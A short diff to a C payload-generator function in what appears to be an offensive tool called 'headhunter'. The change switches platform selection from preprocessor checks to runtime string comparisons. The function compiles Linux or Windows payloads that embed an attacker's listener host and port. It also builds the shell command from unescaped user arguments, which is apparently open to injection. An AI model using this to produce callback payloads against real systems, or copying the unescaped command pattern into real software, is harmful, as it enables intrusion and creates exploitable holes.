@@ -110,19 +110,19 @@ int generate_payload(char* platform, char* outfile, char* port, char* lhost) {
 	char cmd[CMD_SIZE];
 
 	// generate different compile commands based on the payload's platform
-#if defined (__gnu_linux__) || defined (__linux__)
-		// cmd = 'gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile'
+	if(strcmp(platform, "linux") == 0)
+		// gcc payload_linux.c -D PORT=port -D LHOST='"lhost"' -o outfile
 		snprintf(cmd, CMD_SIZE, "gcc /usr/lib/headhunter/payload/payload_linux.c -D PORT=%s -D LHOST='\"%s\"' -o %s", port, lhost, outfile);
-#elif defined (_WIN64) || defined (__MINGW64__)
-		// cmd = 'x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32'
+	else if(strcmp(platform, "win64") == 0)
+		// x86_64-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
 		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
-#elif defined(_WIN32) || defined (__MINGW32__)
-		// cmd = 'i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32'
+	else if(strcmp(platform, "win32") == 0)
+		// i686-w64-mingw32-gcc payload_win.c -D PORT=port -D LHOST='"lhost"' -o outfile -lws2_32
 		snprintf(cmd, CMD_SIZE, "i686-w64-mingw32-gcc /usr/lib/headhunter/payload/payload_windows.c -D PORT=%s -D LHOST='\"%s\"' -o %s -lws2_32", port, lhost, outfile);
-#else
+	else{
 		printf("Please enter a valid platform.\n");
 		return 1;
-#endif
+	}
 
 	// text to make the command feel nicer to use
 	printf("Generating payload...\n");
